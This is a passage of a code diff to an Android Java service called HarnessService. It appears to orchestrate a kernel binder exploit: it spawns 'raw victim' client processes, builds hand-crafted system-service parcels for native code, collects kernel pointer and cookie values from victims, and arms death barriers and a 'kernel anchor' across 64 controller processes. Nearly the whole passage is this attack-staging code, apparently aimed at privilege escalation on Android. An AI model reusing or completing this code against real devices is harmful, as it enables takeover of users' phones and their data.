                     exception.getClass().getSimpleName();
         } finally {
+            if (candidateNode != null) {
+                candidateNode.recycle();
+            }
             reply.recycle();
             data.recycle();
         }
@@ -3699,7 +5315,8 @@ public final class HarnessService extends Service {
             synchronized (extraRawClientLock) {
                 if (slot.state != RawClientSlotState.EMPTY ||
                         slot.connection != null || slot.bound ||
-                        slot.unbinding || slot.service != null) {
+                        slot.unbinding || slot.service != null ||
+                        slot.deathBarrier != 0) {
                     return "status=fail stage=raw-client-extra " +
                             "reason=old-binding index=" + slot.index;
                 }
@@ -3733,34 +5350,43 @@ public final class HarnessService extends Service {
                 }
             }
         }
-        int prepared = 0;
+        AtomicInteger prepared = new AtomicInteger();
+        CountDownLatch preparationComplete =
+                new CountDownLatch(extraRawClientSlots.length);
         for (RawClientSlot slot : extraRawClientSlots) {
             IBinder service;
             synchronized (extraRawClientLock) {
                 service = slot.service;
             }
-            Parcel data = Parcel.obtain();
-            Parcel reply = Parcel.obtain();
-            try {
-                if (!service.transact(
-                        RawBClientService.TRANSACTION_PREPARE_TARGET,
-                        data, reply, 0)) {
-                    break;
+            new Thread(() -> {
+                Parcel data = Parcel.obtain();
+                Parcel reply = Parcel.obtain();
+                try {
+                    if (service.transact(
+                            RawBClientService.TRANSACTION_PREPARE_TARGET,
+                            data, reply, 0)) {
+                        reply.readException();
+                        String state = reply.readString();
+                        if (state != null &&
+                                state.startsWith("status=pass")) {
+                            prepared.incrementAndGet();
+                        }
+                    }
+                } catch (Exception ignored) {
+                } finally {
+                    reply.recycle();
+                    data.recycle();
+                    preparationComplete.countDown();
                 }
-                reply.readException();
-                String state = reply.readString();
-                if (state == null || !state.startsWith("status=pass")) {
-                    break;
-                }
-                prepared++;
-            } finally {
-                reply.recycle();
-                data.recycle();
-            }
+            }, "raw-client-prepare-" + slot.index).start();
         }
+        boolean preparationFinished =
+                preparationComplete.await(30, TimeUnit.SECONDS);
         return "status=" +
-                (prepared == extraRawClientSlots.length ? "pass" : "fail") +
-                " stage=raw-client-extra prepared=" + prepared;
+                (preparationFinished &&
+                 prepared.get() == extraRawClientSlots.length
+                        ? "pass" : "fail") +
+                " stage=raw-client-extra prepared=" + prepared.get();
     }
 
     private String prepareDeferredRawClients() throws Exception {
@@ -3784,70 +5410,143 @@ public final class HarnessService extends Service {
                 return "status=fail stage=raw-extra-receivers reason=looper";
             }
         }
-        String connected = connectExtraRawClients();
-        if (!connected.startsWith("status=pass")) {
-            return connected;
-        }
-        String armed = exportAndArmExtraRawClients();
-        if (!armed.startsWith("status=pass")) {
-            return armed;
-        }
-        writePrivate("raw-extra-export.go",
-                "status=pass stage=raw-extra-export-go");
-        File submitting = new File(getFilesDir(),
-                "raw-extra-export.submitting");
-        for (int attempt = 0; attempt < 1500; attempt++) {
-            if (readSmall(submitting).startsWith("status=ready")) {
-                extraRawClientState = armed;
-                return "status=pass stage=raw-extra-deferred";
+        releaseExtraRawClientSlots(true);
+        Parcel serviceManager = Parcel.obtain();
+        Parcel startService = Parcel.obtain();
+        String serviceExport;
+        String startExport;
+        File serviceTemplate = new File(getFilesDir(),
+                "raw-route-victim-service.template");
+        File startTemplate = new File(getFilesDir(),
+                "raw-route-victim-start.template");
+        try {
+            Binder callbackMarker = new Binder();
+            serviceManager.writeInterfaceToken("android.os.IServiceManager");
+            serviceManager.writeString("activity");
+            Intent broker = new Intent(this, HarnessService.class);
+            broker.putExtra("stage", "raw-binder-broker");
+            broker.putExtra(RAW_BROKER_VICTIM_EXTRA, true);
+            android.os.Bundle extras = broker.getExtras();
+            if (extras == null) {
+                extras = new android.os.Bundle();
             }
-            Thread.sleep(20);
+            extras.putBinder(RAW_BROKER_CALLBACK_EXTRA, callbackMarker);
+            broker.replaceExtras(extras);
+            startService.writeInterfaceToken(
+                    "android.app.IActivityManager");
+            startService.writeStrongBinder(null);
+            startService.writeTypedObject(broker, 0);
+            startService.writeString(null);
+            startService.writeBoolean(false);
+            startService.writeString(getPackageName());
+            startService.writeString(null);
+            startService.writeInt(Process.myUid() / 100000);
+            serviceExport = NativeBridge.exportParcelTemplate(
+                    serviceManager, serviceTemplate.getPath());
+            startExport = NativeBridge.exportParcelTemplate(
+                    startService, startTemplate.getPath());
+        } finally {
+            startService.recycle();
+            serviceManager.recycle();
         }
-        return "status=fail stage=raw-extra-deferred reason=submit";
+        boolean templates = serviceExport.startsWith("status=pass") &&
+                startExport.startsWith("status=pass");
+        String started = templates
+                ? NativeBridge.startRawVictimExports(
+                        serviceTemplate.getPath(), startTemplate.getPath(),
+                        RAW_VICTIM_COUNT - 1)
+                : "status=fail stage=raw-victim-export-start" +
+                        " reason=templates";
+        rawVictimContextsActive = started.startsWith("status=pass");
+        extraRawClientState = started;
+        return "status=" + (rawVictimContextsActive ? "pass" : "fail") +
+                " stage=raw-extra-deferred mode=native-contexts" +
+                " service=[" + serviceExport + "] start_template=[" +
+                startExport + "] cohort=[" + started + "]";
     }
 
     private String exportAndArmExtraRawClients() throws Exception {
-        int armed = 0;
-        for (RawClientSlot slot : extraRawClientSlots) {
-            IBinder service;
-            synchronized (extraRawClientLock) {
+        AtomicInteger armed = new AtomicInteger();
+        CountDownLatch armingComplete =
+                new CountDownLatch(extraRawClientSlots.length);
+        IBinder[] services = new IBinder[extraRawClientSlots.length];
+        synchronized (extraRawClientLock) {
+            for (RawClientSlot slot : extraRawClientSlots) {
                 if (slot.state != RawClientSlotState.ACTIVE ||
                         slot.connection == null || !slot.bound ||
                         slot.unbinding || slot.service == null) {
-                    break;
+                    return "status=fail stage=raw-extra-export-armed" +
+                            " reason=slot index=" + slot.index;
                 }
                 slot.pid = -1;
                 slot.identity = null;
                 slot.pointer = 0;
                 slot.cookie = 0;
-                service = slot.service;
-            }
-            Parcel data = Parcel.obtain();
-            Parcel reply = Parcel.obtain();
-            try {
-                data.writeInt(slot.index);
-                if (!service.transact(
-                        RawBClientService.TRANSACTION_START_DEFERRED_EXPORT,
-                        data, reply, 0)) {
-                    break;
-                }
-                reply.readException();
-                String state = reply.readString();
-                if (state == null || !state.startsWith("status=pass")) {
-                    break;
-                }
-                armed++;
-            } finally {
-                reply.recycle();
-                data.recycle();
+                services[slot.index] = slot.service;
             }
         }
-        return "status=" + (armed == RAW_VICTIM_COUNT - 1
+        for (RawClientSlot slot : extraRawClientSlots) {
+            IBinder service = services[slot.index];
+            new Thread(() -> {
+                Parcel data = Parcel.obtain();
+                Parcel reply = Parcel.obtain();
+                try {
+                    data.writeInt(slot.index);
+                    if (service.transact(
+                            RawBClientService.TRANSACTION_START_DEFERRED_EXPORT,
+                            data, reply, 0)) {
+                        reply.readException();
+                        String state = reply.readString();
+                        if (state != null &&
+                                state.startsWith("status=pass")) {
+                            armed.incrementAndGet();
+                        }
+                    }
+                } catch (Exception ignored) {
+                } finally {
+                    reply.recycle();
+                    data.recycle();
+                    armingComplete.countDown();
+                }
+            }, "raw-client-arm-" + slot.index).start();
+        }
+        boolean armingFinished = armingComplete.await(30, TimeUnit.SECONDS);
+        return "status=" + (armingFinished &&
+                        armed.get() == RAW_VICTIM_COUNT - 1
                         ? "pass" : "fail") +
-                " stage=raw-extra-export-armed clients=" + armed;
+                " stage=raw-extra-export-armed clients=" + armed.get();
     }
 
     private String collectExtraRawClients() throws Exception {
+        if (rawVictimContextsActive) {
+            long[] tokens = NativeBridge.collectRawVictimExports(
+                    RAW_VICTIM_COUNT - 1);
+            if (tokens == null ||
+                    tokens.length != (RAW_VICTIM_COUNT - 1) * 2) {
+                return "status=fail stage=raw-extra-export-collected" +
+                        " mode=native-contexts reason=tokens";
+            }
+            Set<Long> pointers = new HashSet<>();
+            synchronized (extraRawClientLock) {
+                for (RawClientSlot slot : extraRawClientSlots) {
+                    long pointer = tokens[slot.index * 2];
+                    long cookie = tokens[slot.index * 2 + 1];
+                    if (pointer == 0 || cookie == 0 ||
+                            !pointers.add(pointer)) {
+                        return "status=fail" +
+                                " stage=raw-extra-export-collected" +
+                                " mode=native-contexts reason=payload" +
+                                " index=" + slot.index;
+                    }
+                    slot.pointer = pointer;
+                    slot.cookie = cookie;
+                    slot.state = RawClientSlotState.CONSUMED;
+                }
+            }
+            return "status=pass stage=raw-extra-export-collected" +
+                    " mode=native-contexts clients=" +
+                    (RAW_VICTIM_COUNT - 1);
+        }
         Set<Integer> pids = new HashSet<>();
         int collected = 0;
         for (RawClientSlot slot : extraRawClientSlots) {
@@ -3872,24 +5571,38 @@ public final class HarnessService extends Service {
             ProcessIdentity exactIdentity = queryServiceIdentity(
                     service,
                     RawBClientService.TRANSACTION_IDENTITY);
+            long deathBarrier = exactIdentity == null ? 0 :
+                    NativeBridge.armBinderDeathBarrier(service);
             if (!state.startsWith("status=pass") || pid <= 0 ||
                     startTime <= 0 ||
                     exactIdentity == null || exactIdentity.pid != pid ||
                     exactIdentity.startTime != startTime ||
                     pointer == 0 || cookie == 0 || !pids.add(pid) ||
-                    !isOriginalIdentityLive(exactIdentity)) {
+                    !isOriginalIdentityLive(exactIdentity) ||
+                    deathBarrier == 0) {
+                if (deathBarrier != 0) {
+                    NativeBridge.discardBinderDeathBarrier(deathBarrier);
+                }
                 break;
             }
+            boolean accepted = false;
             synchronized (extraRawClientLock) {
                 if (slot.state != RawClientSlotState.ACTIVE ||
                         slot.service != service || !slot.bound ||
-                        slot.unbinding) {
-                    break;
+                        slot.unbinding || slot.deathBarrier != 0) {
+                    accepted = false;
+                } else {
+                    slot.pid = pid;
+                    slot.identity = exactIdentity;
+                    slot.pointer = pointer;
+                    slot.cookie = cookie;
+                    slot.deathBarrier = deathBarrier;
+                    accepted = true;
                 }
-                slot.pid = pid;
-                slot.identity = exactIdentity;
-                slot.pointer = pointer;
-                slot.cookie = cookie;
+            }
+            if (!accepted) {
+                NativeBridge.discardBinderDeathBarrier(deathBarrier);
+                break;
             }
             collected++;
         }
@@ -3913,6 +5626,11 @@ public final class HarnessService extends Service {
                 rawTargetService = null;
             }
         };
+        int boundarySignalFd =
+                NativeBridge.createRawTargetBoundarySignal();
+        if (boundarySignalFd < 0) {
+            return "status=fail stage=raw-target reason=boundary-signal";
+        }
         Intent targetIntent = new Intent(this, RawTargetService.class)
                 .putExtra(RawTargetService.EXTRA_NONCE,
                         rootWatchdogNonce)
@@ -3920,11 +5638,38 @@ public final class HarnessService extends Service {
                         rootWatchdogBootId)
                 .putExtra(RawTargetService.EXTRA_TERMINAL_CLEANUP,
                         directTerminalCleanup);
-        if (!bindService(targetIntent,
-                rawTargetConnection, Context.BIND_AUTO_CREATE) ||
-                !connected.await(30, TimeUnit.SECONDS) ||
-                rawTargetService == null) {
+        boolean bound = bindService(targetIntent,
+                rawTargetConnection, Context.BIND_AUTO_CREATE) &&
+                connected.await(30, TimeUnit.SECONDS) &&
+                rawTargetService != null;
+        if (!bound) {
+            NativeBridge.closeRawTargetBoundarySignal();
             return "status=fail stage=raw-target reason=bind";
+        }
+        boolean boundaryArmed = false;
+        try (ParcelFileDescriptor boundarySignal =
+                     ParcelFileDescriptor.fromFd(boundarySignalFd)) {
+            Parcel data = Parcel.obtain();
+            Parcel reply = Parcel.obtain();
+            try {
+                data.writeFileDescriptor(boundarySignal.getFileDescriptor());
+                boundaryArmed = rawTargetService.transact(
+                        RawTargetService.TRANSACTION_BOUNDARY_SIGNAL,
+                        data, reply, 0);
+                if (boundaryArmed) {
+                    reply.readException();
+                    boundaryArmed = reply.readInt() == 1;
+                }
+            } finally {
+                reply.recycle();
+                data.recycle();
+            }
+        } catch (Exception ignored) {
+            boundaryArmed = false;
+        }
+        if (!boundaryArmed) {
+            NativeBridge.closeRawTargetBoundarySignal();
+            return "status=fail stage=raw-target reason=boundary-transport";
         }
         rawTargetProcessIdentity = queryServiceIdentity(
                 rawTargetService, RawTargetService.TRANSACTION_IDENTITY);
@@ -4220,8 +5965,14 @@ public final class HarnessService extends Service {
                     pass = false;
                     break;
                 }
+                long deathBarrier = NativeBridge.armBinderDeathBarrier(
+                        controllers.get(index));
+                if (deathBarrier == 0) {
+                    pass = false;
+                    break;
+                }
                 candidatePairs.add(new IsolatedControllerPair(
-                        controllers.get(index), pid));
+                        controllers.get(index), pid, deathBarrier));
             }
             pass = pass && candidatePairs.size() == 64 &&
                     controllerPidSet.size() == 64 &&
@@ -4247,6 +5998,14 @@ public final class HarnessService extends Service {
             }
             isolatedControllerPairs = Collections.unmodifiableList(
                     new ArrayList<>(candidatePairs));
+        } else {
+            for (IsolatedControllerPair pair : candidatePairs) {
+                if (pair.deathBarrier != 0) {
+                    NativeBridge.discardBinderDeathBarrier(
+                            pair.deathBarrier);
+                    pair.deathBarrier = 0;
+                }
+            }
         }
         kernelAnchorRetained = pass ? anchorRetained : 0;
         return "status=" + (pass ? "pass" : "fail") +
@@ -4264,8 +6023,14 @@ public final class HarnessService extends Service {
 
     private String retainKernelAnchor(List<IBinder> controllers, int count)
             throws Exception {
-        if (count <= 0 || count > controllers.size() ||
-                kernelAnchorRetained != count) {
+        if (count <= 0 || count > controllers.size()) {
+            return "status=fail stage=anchor-retain reason=preflight";
+        }
+        return retainKernelAnchor(count);
+    }
+
+    private String retainKernelAnchor(int count) throws Exception {
+        if (count <= 0 || kernelAnchorRetained != count) {
             return "status=fail stage=anchor-retain reason=preflight";
         }
         int retained = kernelAnchorRetained;
@@ -4474,10 +6239,23 @@ public final class HarnessService extends Service {
 
     private String queueExtraRawClientAndWaitExit(int index)
             throws Exception {
+        if (rawVictimContextsActive) {
+            if (index < 0 || index >= RAW_VICTIM_COUNT - 1) {
+                return "status=fail stage=raw-client-exit" +
+                        " mode=native-context reason=index";
+            }
+            String retired = NativeBridge.queueAndRetireRawVictimContext(
+                    index + 1);
+            return retired.startsWith("status=pass")
+                    ? retired
+                    : "status=fail stage=raw-client-exit" +
+                            " mode=native-context native=[" + retired + "]";
+        }
         RawClientSlot slot;
         int pid;
         ProcessIdentity identity;
         ServiceConnection slotConnection;
+        long deathBarrier;
         synchronized (extraRawClientLock) {
             if (index < 0 || index >= extraRawClientSlots.length) {
                 return "status=fail stage=raw-client-exit reason=index";
@@ -4486,29 +6264,34 @@ public final class HarnessService extends Service {
             pid = slot.pid;
             identity = slot.identity;
             slotConnection = slot.connection;
+            deathBarrier = slot.deathBarrier;
             if (slot.state != RawClientSlotState.ACTIVE || pid <= 0 ||
                     identity == null || identity.pid != pid ||
                     slotConnection == null || !slot.bound ||
                     slot.unbinding || slot.service == null ||
-                    !isOriginalIdentityLive(identity)) {
+                    !isOriginalIdentityLive(identity) || deathBarrier == 0) {
                 return "status=fail stage=raw-client-exit reason=preflight";
             }
             slot.state = RawClientSlotState.RETIRING;
+            slot.deathBarrier = 0;
         }
         File result = new File(getFilesDir(),
                 "raw-client.result." + pid);
         result.delete();
         writePrivate("raw-extra-queue.enable." + index,
                 "status=pass stage=raw-extra-queue-enable");
-        for (int attempt = 0;
-             attempt < 3000 && isOriginalIdentityLive(identity); attempt++) {
+        String death = NativeBridge.awaitBinderDeathBarrier(
+                deathBarrier, 5000);
+        boolean deathPassed = death.startsWith(
+                "status=pass stage=binder-death-barrier ");
+        for (int attempt = 0; deathPassed &&
+                attempt < 500 && isOriginalIdentityLive(identity); attempt++) {
             Thread.sleep(10);
         }
         boolean dead = !isOriginalIdentityLive(identity);
         boolean passed = result.exists() &&
                 readSmall(result).startsWith("status=pass");
-        int deferredSettleMs = dead && passed ? 1500 : 0;
-        if (deferredSettleMs > 0) {
+        if (dead && passed && deathPassed) {
             if (!unbindExtraRawClientSlot(slot, slotConnection)) {
                 return "status=fail stage=raw-client-exit index=" + index +
                         " pid=" + pid + " reason=unbind";
@@ -4526,18 +6309,18 @@ public final class HarnessService extends Service {
                 slot.identity = null;
                 slot.state = RawClientSlotState.CONSUMED;
             }
-            Thread.sleep(deferredSettleMs);
         } else {
             unbindExtraRawClientSlot(slot, slotConnection);
             synchronized (extraRawClientLock) {
                 slot.state = RawClientSlotState.FAILED;
             }
         }
-        return "status=" + (dead && passed ? "pass" : "fail") +
+        return "status=" +
+                (dead && passed && deathPassed ? "pass" : "fail") +
                 " stage=raw-client-exit index=" + index +
                 " pid=" + pid + " dead=" + (dead ? 1 : 0) +
                 " result=" + (passed ? 1 : 0) +
-                " deferred_settle_ms=" + deferredSettleMs;
+                " death=[" + death + "]";
     }
 
     private void abortRawClient() {
